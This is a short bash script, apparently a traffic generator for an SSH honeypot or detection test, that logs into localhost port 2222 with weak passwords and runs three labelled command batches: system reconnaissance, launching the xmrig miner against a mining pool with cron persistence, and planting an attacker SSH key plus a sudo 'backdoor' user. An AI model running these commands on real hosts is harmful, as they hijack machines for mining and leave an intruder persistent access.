#!/bin/bash
SSH="ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
for i in $(seq 1 15); do
  # RECON (many enumeration commands, no download)
  sshpass -p 123456 $SSH root@localhost << 'E' 2>/dev/null
uname -a
whoami
id
cat /etc/passwd
ls -la /
ps aux
netstat -an
free -m
w
last
E
  # MINER (xmrig / crontab keywords)
  sshpass -p admin $SSH root@localhost << 'E' 2>/dev/null
cd /tmp
./xmrig -o pool.supportxmr.com:443 -u wallet
crontab -l
echo '* * * * * /tmp/xmrig' | crontab -
E
  # PERSISTENCE (useradd / authorized_keys)
  sshpass -p root $SSH root@localhost << 'E' 2>/dev/null
mkdir -p ~/.ssh
echo 'ssh-rsa AAAAB3xxx attacker' >> ~/.ssh/authorized_keys
useradd -m backdoor
usermod -aG sudo backdoor
passwd backdoor
E
  echo "round $i done"
done
